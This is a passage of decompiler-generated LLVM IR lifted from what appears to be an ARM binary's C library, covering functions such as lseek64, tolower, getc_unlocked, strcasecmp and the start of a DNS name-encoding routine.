  uselistorder i32 7, { 2, 18, 19, 8, 9, 10, 0, 21, 20, 1, 3, 4, 14, 5, 6, 15, 11, 12, 13, 7, 16, 17 }
  uselistorder i32* @global_var_288c8, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 3, 4, 2, 1 }
  uselistorder i32 10, { 3, 4, 39, 5, 6, 40, 41, 42, 43, 44, 32, 16, 31, 7, 45, 1, 46, 47, 48, 49, 12, 17, 50, 18, 51, 19, 20, 21, 0, 33, 34, 22, 30, 52, 9, 24, 23, 35, 36, 11, 15, 14, 10, 13, 2, 37, 38, 25, 8, 27, 28, 26, 29, 53 }
  uselistorder i32* @sb, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 33, 34, 35, 36, 37, 38, 26, 27, 28, 29, 30, 31, 0, 32 }
  uselistorder i32 80, { 0, 1, 3, 4, 5, 6, 2 }
  uselistorder i32 48, { 11, 5, 12, 1, 0, 13, 14, 2, 15, 16, 17, 3, 6, 18, 7, 19, 20, 10, 8, 9, 4 }
  uselistorder i32 56, { 3, 4, 5, 6, 7, 8, 9, 1, 0, 2 }
  uselistorder i32 44, { 12, 13, 14, 15, 16, 17, 20, 1, 19, 18, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 59, 60, 61, 0, 62, 63, 50, 64, 65, 66, 67, 68, 69, 70, 71, 83, 39, 40, 36, 72, 44, 73, 74, 53, 54, 4, 3, 6, 5, 8, 7, 1, 37, 75, 25, 76, 2, 45, 77, 78, 79, 80, 81, 26, 82, 51, 52, 84, 46, 47, 10, 9, 28, 12, 11, 27, 14, 13, 29, 38, 55, 56, 57, 16, 15, 30, 18, 17, 31, 41, 48, 58, 32, 20, 19, 22, 21, 33, 34, 24, 23, 35, 42, 43, 49 }
  uselistorder i32* @fp, { 62, 65, 63, 1, 64, 66, 67, 68, 69, 0, 71, 70, 72, 73, 74, 75, 2, 88, 89, 90, 91, 92, 93, 94, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 120, 119, 114, 115, 116, 117, 118 }
  uselistorder i32* @sl, { 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 20, 21, 2, 3, 22, 23, 0, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 40, 41, 42, 43, 44, 45, 46, 1, 47, 48, 49, 50, 51, 4, 5, 6, 7 }
  uselistorder i32* @r8, { 21, 22, 23, 24, 25, 26, 27, 6, 7, 8, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 1, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0, 67, 68, 69, 70, 71, 2, 72, 73, 74, 75, 76, 77, 94, 95, 9, 10, 93, 87, 88, 89, 90, 91, 92, 3, 78, 79, 80, 81, 82, 83, 84, 4, 5, 85, 86, 17, 18, 19, 20, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* @r7, { 29, 31, 32, 30, 33, 34, 35, 36, 37, 38, 9, 10, 11, 12, 13, 14, 15, 1, 39, 3, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 99, 16, 17, 2, 18, 6, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 68, 69, 70, 71, 4, 5, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 0, 7, 8, 83, 84, 97, 98, 25, 26, 27, 28, 19, 20, 21, 22, 23, 24 }
  uselistorder label %dec_label_pc_1b700, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1b6fc, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1b6cc, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1b6c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b66c, { 1, 0 }
  uselistorder label %dec_label_pc_1b618, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b5b8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_1b574, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1b428, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1b754, label %dec_label_pc_1b740

dec_label_pc_1b740:                               ; preds = %entry
  %v0_1b740 = call i32 @__errno_location()
  %v0_1b744 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b744 = sub i32 0, %v0_1b744
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1b74c = inttoptr i32 %v0_1b740 to i32*
  store i32 %v1_1b744, i32* %v2_1b74c, align 4
  %v0_1b75c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b75c

dec_label_pc_1b754:                               ; preds = %entry
  %v2_1b754 = icmp eq i32 %arg1, 0
  br i1 %v2_1b754, label %dec_label_pc_1b768, label %dec_label_pc_1b75c

dec_label_pc_1b75c:                               ; preds = %dec_label_pc_1b754, %dec_label_pc_1b740
  %v0_1b75c = phi i32 [ %arg1, %dec_label_pc_1b754 ], [ %v0_1b75c.pre, %dec_label_pc_1b740 ]
  br label %dec_label_pc_1b76c

dec_label_pc_1b768:                               ; preds = %dec_label_pc_1b754
  br label %dec_label_pc_1b76c

dec_label_pc_1b76c:                               ; preds = %dec_label_pc_1b75c, %dec_label_pc_1b768
  %v14_1b770 = phi i32 [ %v0_1b75c, %dec_label_pc_1b75c ], [ %tmp9, %dec_label_pc_1b768 ]
  ret i32 %v14_1b770

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1b76c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1b77c = icmp slt i32 %arg1, 0
  br i1 %v1_1b77c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1b77c = mul i32 %arg1, 2
  %v2_1b788 = load i32, i32* bitcast (i32** @global_var_28c04.944 to i32*), align 4
  %v2_1b78c = add i32 %v2_1b788, %v2_1b77c
  %v3_1b790 = inttoptr i32 %v2_1b78c to i8*
  %v4_1b790 = load i8, i8* %v3_1b790, align 1
  %v6_1b790 = zext i8 %v4_1b790 to i32
  %v1_1b794 = add i32 %v2_1b78c, 1
  %v2_1b794 = inttoptr i32 %v1_1b794 to i8*
  %v3_1b794 = load i8, i8* %v2_1b794, align 1
  %v4_1b794 = zext i8 %v3_1b794 to i32
  %v3_1b798 = mul nuw i32 %v4_1b794, 16777216
  %v4_1b79c = sdiv i32 %v3_1b798, 65536
  %v5_1b79c = or i32 %v4_1b79c, %v6_1b790
  ret i32 %v5_1b79c

; uselistorder directives
  uselistorder i32 %v2_1b78c, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_1b7a8 = load i32, i32* @r4, align 4
  store i32 %v3_1b7a8, i32* %stack_var_-8, align 4
  %v0_1b7ac = load i32, i32* @r0, align 4
  %v1_1b7ac = add i32 %v0_1b7ac, 16
  %v2_1b7ac = inttoptr i32 %v1_1b7ac to i32*
  %v3_1b7ac = load i32, i32* %v2_1b7ac, align 4
  store i32 %v3_1b7ac, i32* %r2.global-to-local, align 4
  %v1_1b7b0 = add i32 %v0_1b7ac, 24
  %v2_1b7b0 = inttoptr i32 %v1_1b7b0 to i32*
  %v3_1b7b0 = load i32, i32* %v2_1b7b0, align 4
  %v3_1b7b4 = icmp ult i32 %v3_1b7ac, %v3_1b7b0
  store i32 %v0_1b7ac, i32* @r4, align 4
  br i1 %v3_1b7b4, label %bb, label %dec_label_pc_1b7cc

bb:                                               ; preds = %entry
  %v2_1b7bc = inttoptr i32 %v3_1b7ac to i8*
  %v3_1b7bc = load i8, i8* %v2_1b7bc, align 1
  %v4_1b7bc = zext i8 %v3_1b7bc to i32
  store i32 %v4_1b7bc, i32* %r0.global-to-local, align 4
  %v6_1b7bc = add i32 %v3_1b7ac, 1
  store i32 %v6_1b7bc, i32* %r2.global-to-local, align 4
  store i32 %v6_1b7bc, i32* %v2_1b7ac, align 4
  br label %dec_label_pc_1b8cc

dec_label_pc_1b7cc:                               ; preds = %entry
  %v1_1b7cc = inttoptr i32 %v0_1b7ac to i8*
  %v2_1b7cc = load i8, i8* %v1_1b7cc, align 1
  %v3_1b7cc = zext i8 %v2_1b7cc to i32
  %v1_1b7d0 = and i32 %v3_1b7cc, 131
  %tmp22 = icmp ugt i32 %v1_1b7d0, 128
  br i1 %tmp22, label %dec_label_pc_1b7ec, label %dec_label_pc_1b7dc

dec_label_pc_1b7dc:                               ; preds = %dec_label_pc_1b7cc
  store i32 128, i32* @r1, align 4
  %v0_1b7e0 = call i32 @__stdio_trans2r_o()
  store i32 %v0_1b7e0, i32* %r0.global-to-local, align 4
  %v2_1b7e4 = icmp eq i32 %v0_1b7e0, 0
  br i1 %v2_1b7e4, label %dec_label_pc_1b7dc.dec_label_pc_1b7ec_crit_edge, label %dec_label_pc_1b8c8

dec_label_pc_1b7dc.dec_label_pc_1b7ec_crit_edge:  ; preds = %dec_label_pc_1b7dc
  %v0_1b7ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b7ec

dec_label_pc_1b7ec:                               ; preds = %dec_label_pc_1b7dc.dec_label_pc_1b7ec_crit_edge, %dec_label_pc_1b7cc
  %v2_1b838 = phi i32 [ %v0_1b7ec.pre, %dec_label_pc_1b7dc.dec_label_pc_1b7ec_crit_edge ], [ %v0_1b7ac, %dec_label_pc_1b7cc ]
  %v1_1b7ec = inttoptr i32 %v2_1b838 to i8*
  %v2_1b7ec = load i8, i8* %v1_1b7ec, align 1
  %v3_1b7ec = zext i8 %v2_1b7ec to i32
  store i32 %v3_1b7ec, i32* %r2.global-to-local, align 4
  %v1_1b7f0 = add i32 %v2_1b838, 1
  %v2_1b7f0 = inttoptr i32 %v1_1b7f0 to i8*
  %v3_1b7f0 = load i8, i8* %v2_1b7f0, align 1
  %v4_1b7f0 = zext i8 %v3_1b7f0 to i32
  %v4_1b7f4 = mul nuw nsw i32 %v4_1b7f0, 256
  %v5_1b7f4 = or i32 %v4_1b7f4, %v3_1b7ec
  store i32 %v5_1b7f4, i32* %r2.global-to-local, align 4
  %v1_1b7f8 = and i32 %v3_1b7ec, 2
  %v2_1b7f8 = icmp eq i32 %v1_1b7f8, 0
  br i1 %v2_1b7f8, label %dec_label_pc_1b828, label %dec_label_pc_1b800

dec_label_pc_1b800:                               ; preds = %dec_label_pc_1b7ec
  %tmp23 = urem i8 %v2_1b7ec, 2
  %v1_1b800 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_1b800
  %v4_1b804 = and i32 %tmp18, 4
  %v5_1b804 = add i32 %v4_1b804, %v2_1b838
  %v1_1b808 = add i32 %v5_1b804, 36
  %v2_1b808 = inttoptr i32 %v1_1b808 to i8*
  %v3_1b808 = load i8, i8* %v2_1b808, align 1
  %v4_1b808 = zext i8 %v3_1b808 to i32
  %v1_1b80c = add nsw i32 %v5_1b7f4, -1
  store i32 %v1_1b80c, i32* %r2.global-to-local, align 4
  %v3_1b810 = sdiv i32 %v1_1b80c, 256
  store i32 %v3_1b810, i32* %r1.global-to-local, align 4
  store i32 %v4_1b808, i32* %r0.global-to-local, align 4
  %v2_1b81c = add i32 %v2_1b838, 40
  %v3_1b81c = inttoptr i32 %v2_1b81c to i32*
  store i32 0, i32* %v3_1b81c, align 4
  %v0_1b820 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b820 = trunc i32 %v0_1b820 to i8
  %v2_1b820 = load i32, i32* @r4, align 4
  %v3_1b820 = add i32 %v2_1b820, 1
  %v4_1b820 = inttoptr i32 %v3_1b820 to i8*
  store i8 %v1_1b820, i8* %v4_1b820, align 1
  br label %dec_label_pc_1b85c

dec_label_pc_1b828:                               ; preds = %dec_label_pc_1b7ec
  %v1_1b828 = add i32 %v2_1b838, 16
  store i32 %v1_1b828, i32* %r1.global-to-local, align 4
  %v1_1b82c = inttoptr i32 %v1_1b828 to i32*
  %v2_1b82c = load i32, i32* %v1_1b82c, align 4
  store i32 %v2_1b82c, i32* %r1.global-to-local, align 4
  %v3_1b82c = add i32 %v2_1b838, 20
  %v4_1b82c = inttoptr i32 %v3_1b82c to i32*
  %v5_1b82c = load i32, i32* %v4_1b82c, align 4
  %v9_1b830 = icmp eq i32 %v5_1b82c, %v2_1b82c
  br i1 %v9_1b830, label %dec_label_pc_1b840, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1b828
  %v2_1b834 = inttoptr i32 %v2_1b82c to i8*
  %v3_1b834 = load i8, i8* %v2_1b834, align 1
  %v4_1b834 = zext i8 %v3_1b834 to i32
  store i32 %v4_1b834, i32* %r0.global-to-local, align 4
  %v6_1b834 = add i32 %v2_1b82c, 1
  store i32 %v6_1b834, i32* %r1.global-to-local, align 4
  store i32 %v6_1b834, i32* %v1_1b82c, align 4
  br label %dec_label_pc_1b8cc

dec_label_pc_1b840:                               ; preds = %dec_label_pc_1b828
  %v1_1b840 = add i32 %v2_1b838, 4
  %v2_1b840 = inttoptr i32 %v1_1b840 to i32*
  %v3_1b840 = load i32, i32* %v2_1b840, align 4
  %v4_1b848 = icmp eq i32 %v3_1b840, -2
  br i1 %v4_1b848, label %dec_label_pc_1b84c, label %dec_label_pc_1b864

dec_label_pc_1b84c:                               ; preds = %dec_label_pc_1b840
  %v1_1b84c = or i32 %v5_1b7f4, 4
  store i32 %v1_1b84c, i32* %r2.global-to-local, align 4
  store i8 %v3_1b7f0, i8* %v2_1b7f0, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b85c

dec_label_pc_1b85c:                               ; preds = %dec_label_pc_1b800, %dec_label_pc_1b84c
  %v0_1b85c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b85c = trunc i32 %v0_1b85c to i8
  %v2_1b85c = load i32, i32* @r4, align 4
  %v3_1b85c = inttoptr i32 %v2_1b85c to i8*
  store i8 %v1_1b85c, i8* %v3_1b85c, align 1
  br label %dec_label_pc_1b8cc

dec_label_pc_1b864:                               ; preds = %dec_label_pc_1b840
  %v1_1b864 = and i32 %v4_1b7f4, 768
  %v2_1b864 = icmp eq i32 %v1_1b864, 0
  br i1 %v2_1b864, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_1b864
  store i32 ptrtoint (i32** @global_var_288e8.892 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1b864, %bb19
  store i32 112752, i32* @lr, align 4
  %v1_1b86c = xor i1 %v2_1b864, true
  call void @__pseudo_cond_branch(i1 %v1_1b86c, i32 ptrtoint (i32* @global_var_1a5ac.1241 to i32))
  %v0_1b870 = load i32, i32* @r4, align 4
  %v1_1b870 = add i32 %v0_1b870, 8
  store i32 %v1_1b870, i32* %r2.global-to-local, align 4
  %v1_1b874 = inttoptr i32 %v1_1b870 to i32*
  %v2_1b874 = load i32, i32* %v1_1b874, align 4
  store i32 %v2_1b874, i32* %r2.global-to-local, align 4
  %v3_1b874 = add i32 %v0_1b870, 12
  %v4_1b874 = inttoptr i32 %v3_1b874 to i32*
  %v5_1b874 = load i32, i32* %v4_1b874, align 4
  %v9_1b878 = icmp eq i32 %v5_1b874, %v2_1b874
  br i1 %v9_1b878, label %dec_label_pc_1b8ac, label %dec_label_pc_1b880

dec_label_pc_1b880:                               ; preds = %bb20
  %v2_1b880 = add i32 %v0_1b870, 24
  %v3_1b880 = inttoptr i32 %v2_1b880 to i32*
  store i32 %v2_1b874, i32* %v3_1b880, align 4
  %v0_1b884 = load i32, i32* @r4, align 4
  store i32 %v0_1b884, i32* %r0.global-to-local, align 4
  %v2_1b888 = call i32 @__stdio_rfill(i32 %v0_1b884)
  store i32 %v2_1b888, i32* %r0.global-to-local, align 4
  %v2_1b88c = icmp eq i32 %v2_1b888, 0
  br i1 %v2_1b88c, label %dec_label_pc_1b8c8, label %dec_label_pc_1b894

dec_label_pc_1b894:                               ; preds = %dec_label_pc_1b880
  %v0_1b894 = load i32, i32* @r4, align 4
  %v1_1b894 = add i32 %v0_1b894, 20
  %v2_1b894 = inttoptr i32 %v1_1b894 to i32*
  %v3_1b894 = load i32, i32* %v2_1b894, align 4
  %v2_1b898 = add i32 %v0_1b894, 24
  %v3_1b898 = inttoptr i32 %v2_1b898 to i32*
  store i32 %v3_1b894, i32* %v3_1b898, align 4
  %v0_1b89c = load i32, i32* @r4, align 4
  %v1_1b89c = add i32 %v0_1b89c, 16
  %v2_1b89c = inttoptr i32 %v1_1b89c to i32*
  %v3_1b89c = load i32, i32* %v2_1b89c, align 4
  %v1_1b8a0 = inttoptr i32 %v3_1b89c to i8*
  %v2_1b8a0 = load i8, i8* %v1_1b8a0, align 1
  %v3_1b8a0 = zext i8 %v2_1b8a0 to i32
  store i32 %v3_1b8a0, i32* %r0.global-to-local, align 4
  %v5_1b8a0 = add i32 %v3_1b89c, 1
  store i32 %v5_1b8a0, i32* %v2_1b89c, align 4
  br label %dec_label_pc_1b8cc

dec_label_pc_1b8ac:                               ; preds = %bb20
  %v1_1b8ac = inttoptr i32 %v0_1b870 to i8*
  store i32 %v0_1b870, i32* %r0.global-to-local, align 4
  %v2_1b8b0 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_1b8b0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1b8b8 = call i32 @__stdio_READ(i8* %v1_1b8ac, i32 %v2_1b8b0, i32 1)
  store i32 %v5_1b8b8, i32* %r0.global-to-local, align 4
  %v2_1b8bc = icmp eq i32 %v5_1b8b8, 0
  br i1 %v2_1b8bc, label %dec_label_pc_1b8c8, label %bb21

bb21:                                             ; preds = %dec_label_pc_1b8ac
  %v4_1b8c0 = load i8, i8* %stack_var_-9, align 1
  %v5_1b8c0 = sext i8 %v4_1b8c0 to i32
  store i32 %v5_1b8c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b8cc

dec_label_pc_1b8c8:                               ; preds = %dec_label_pc_1b8ac, %dec_label_pc_1b7dc, %dec_label_pc_1b880
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b8cc

dec_label_pc_1b8cc:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_1b894, %dec_label_pc_1b85c, %dec_label_pc_1b8c8
  %v2_1b8d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1b8d0, i32* @r4, align 4
  %v8_1b8d0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1b8d0

; uselistorder directives
  uselistorder i32 %v2_1b82c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1b7ec, { 1, 0, 2 }
  uselistorder i32 %v2_1b838, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_1b7ac, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 2, 3, 4, 5, 6, 7, 8, 15, 13, 14, 12, 10, 11, 0, 9, 1 }
  uselistorder i8** @global_var_28920.876, { 1, 0, 2 }
  uselistorder i32** @global_var_288e8.892, { 0, 2, 1 }
  uselistorder i32 -2, { 7, 2, 4, 5, 3, 13, 6, 12, 8, 14, 16, 15, 17, 0, 9, 1, 10, 18, 11 }
  uselistorder i32 40, { 5, 6, 7, 8, 9, 1, 2, 0, 10, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 36, { 8, 9, 10, 11, 12, 13, 14, 15, 4, 1, 0, 16, 17, 18, 2, 3, 5, 7, 6 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 7, 5, 6, 10, 8, 11, 9, 13, 12 }
  uselistorder i32 131, { 1, 0 }
  uselistorder i32 24, { 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 0, 31, 9, 18, 10, 1, 32, 33, 34, 35, 36, 37, 11, 28, 12, 13, 14, 15, 16, 17, 6, 7, 5, 8, 2, 3, 4, 19 }
  uselistorder label %dec_label_pc_1b8cc, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_1b8c8, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1b85c, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_1b8e8

dec_label_pc_1b8e8:                               ; preds = %bb8, %entry
  %v8_1b94c3 = phi i32 [ %v8_1b94c, %bb8 ], [ 0, %entry ]
  %v0_1b940 = phi i32 [ %v1_1b940, %bb8 ], [ %arg2, %entry ]
  %v0_1b944 = phi i32 [ %v1_1b944, %bb8 ], [ %tmp, %entry ]
  %v9_1b8e8 = icmp eq i32 %v0_1b944, %v0_1b940
  br i1 %v9_1b8e8, label %dec_label_pc_1b8e8._crit_edge, label %dec_label_pc_1b8f0

dec_label_pc_1b8e8._crit_edge:                    ; preds = %dec_label_pc_1b8e8
  %.pre = inttoptr i32 %v0_1b940 to i8*
  br label %bb8

dec_label_pc_1b8f0:                               ; preds = %dec_label_pc_1b8e8
  %v1_1b8f4 = inttoptr i32 %v0_1b944 to i8*
  %v2_1b8f4 = load i8, i8* %v1_1b8f4, align 1
  %v3_1b8f4 = zext i8 %v2_1b8f4 to i32
  %v1_1b8f8 = inttoptr i32 %v0_1b940 to i8*
  %v2_1b8f8 = load i8, i8* %v1_1b8f8, align 1
  %v3_1b8f8 = zext i8 %v2_1b8f8 to i32
  %v2_1b8fc = load i32, i32* bitcast (i32** @global_var_28c04.944 to i32*), align 4
  %v2_1b900 = mul nuw nsw i32 %v3_1b8f4, 2
  %v2_1b904 = mul nuw nsw i32 %v3_1b8f8, 2
  %v2_1b908 = add i32 %v2_1b904, %v2_1b8fc
  %v2_1b90c = add i32 %v2_1b8fc, %v2_1b900
  %v1_1b910 = add i32 %v2_1b90c, 1
  %v2_1b910 = inttoptr i32 %v1_1b910 to i8*
  %v3_1b910 = load i8, i8* %v2_1b910, align 1
  %v4_1b910 = zext i8 %v3_1b910 to i32
  %v1_1b914 = add i32 %v2_1b908, 1
  %v2_1b914 = inttoptr i32 %v1_1b914 to i8*
  %v3_1b914 = load i8, i8* %v2_1b914, align 1
  %v4_1b914 = zext i8 %v3_1b914 to i32
  %v3_1b918 = inttoptr i32 %v2_1b908 to i8*
  %v4_1b918 = load i8, i8* %v3_1b918, align 1
  %v6_1b918 = zext i8 %v4_1b918 to i32
  %v3_1b91c = inttoptr i32 %v2_1b90c to i8*
  %v4_1b91c = load i8, i8* %v3_1b91c, align 1
  %v6_1b91c = zext i8 %v4_1b91c to i32
  %v3_1b920 = mul nuw i32 %v4_1b914, 16777216
  %v3_1b924 = mul nuw i32 %v4_1b910, 16777216
  %v4_1b928 = sdiv i32 %v3_1b924, 65536
  %v5_1b928 = or i32 %v6_1b91c, %v4_1b928
  %v4_1b92c = sdiv i32 %v3_1b920, 65536
  %v5_1b92c = or i32 %v4_1b92c, %v6_1b918
  %v2_1b930 = sub nsw i32 %v5_1b928, %v5_1b92c
  %v9_1b930 = icmp eq i32 %v5_1b928, %v5_1b92c
  br i1 %v9_1b930, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1b8f0
  ret i32 %v2_1b930

bb8:                                              ; preds = %dec_label_pc_1b8e8._crit_edge, %dec_label_pc_1b8f0
  %v1_1b938.pre-phi = phi i8* [ %.pre, %dec_label_pc_1b8e8._crit_edge ], [ %v1_1b8f4, %dec_label_pc_1b8f0 ]
  %v8_1b94c = phi i32 [ %v8_1b94c3, %dec_label_pc_1b8e8._crit_edge ], [ %v2_1b930, %dec_label_pc_1b8f0 ]
  %v2_1b938 = load i8, i8* %v1_1b938.pre-phi, align 1
  %v2_1b93c = icmp eq i8 %v2_1b938, 0
  %v1_1b940 = add i32 %v0_1b940, 1
  %v1_1b944 = add i32 %v0_1b944, 1
  store i32 %v1_1b944, i32* @lr, align 4
  br i1 %v2_1b93c, label %dec_label_pc_1b94c, label %dec_label_pc_1b8e8

dec_label_pc_1b94c:                               ; preds = %bb8
  ret i32 %v8_1b94c

; uselistorder directives
  uselistorder i32 %v1_1b944, { 1, 0 }
  uselistorder i32 %v2_1b930, { 1, 0 }
  uselistorder i32 %v5_1b92c, { 1, 0 }
  uselistorder i32 %v5_1b928, { 1, 0 }
  uselistorder i32 %v0_1b940, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1b954 = load i32, i32* @r4, align 4
  store i32 %v3_1b954, i32* %stack_var_-24, align 4
  %v6_1b954 = load i32, i32* @r5, align 4
  %v9_1b954 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1b95c = load i32, i32* @r1, align 4
  store i32 %v0_1b95c, i32* @r6, align 4
  %v0_1b960 = load i32, i32* @r2, align 4
  store i32 %v0_1b960, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1b9c819 = icmp slt i8* %arg1, null
  store i1 %v1_1b9c819, i1* %cpsr_n.global-to-local, align 1
  %v2_1b9c820 = icmp eq i8* %arg1, null
  store i1 %v2_1b9c820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b9c820, label %dec_label_pc_1b9e0, label %dec_label_pc_1b9d4

dec_label_pc_1b96c:                               ; preds = %dec_label_pc_1b9d4
  %v2_1b96c = call i32 @__GI_strchr(i32 %v0_1b96c21, i32 46)
  store i32 %v2_1b96c, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1b970 = icmp slt i32 %v2_1b96c, 0
  store i1 %v1_1b970, i1* %cpsr_n.global-to-local, align 1
  %v2_1b970 = icmp eq i32 %v2_1b96c, 0
  store i1 %v2_1b970, i1* %cpsr_z.global-to-local, align 1
  %v0_1b974 = load i32, i32* @r4, align 4
  %v2_1b974 = sub i32 %v2_1b96c, %v0_1b974
  store i32 %v2_1b974, i32* %ip.global-to-local, align 4
  store i32 %v0_1b974, i32* %r0.global-to-local, align 4
  br i1 %v2_1b970, label %dec_label_pc_1b980, label %dec_label_pc_1b988

dec_label_pc_1b980:                               ; preds = %dec_label_pc_1b96c
  %v1_1b978 = inttoptr i32 %v0_1b974 to i8*
  %v3_1b980 = call i32 @strlen(i8* %v1_1b978)
  store i32 %v3_1b980, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1b980, 16777216
  %v1_1b984 = sdiv i32 %sext, 16777216
  store i32 %v1_1b984, i32* %ip.global-to-local, align 4
  %v0_1b994.pre = load i32, i32* @r4, align 4
  %v0_1b9a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b988

dec_label_pc_1b988:                               ; preds = %dec_label_pc_1b96c, %dec_label_pc_1b980
  %v0_1b9a4 = phi i32 [ %v2_1b96c, %dec_label_pc_1b96c ], [ %v0_1b9a4.pre, %dec_label_pc_1b980 ]
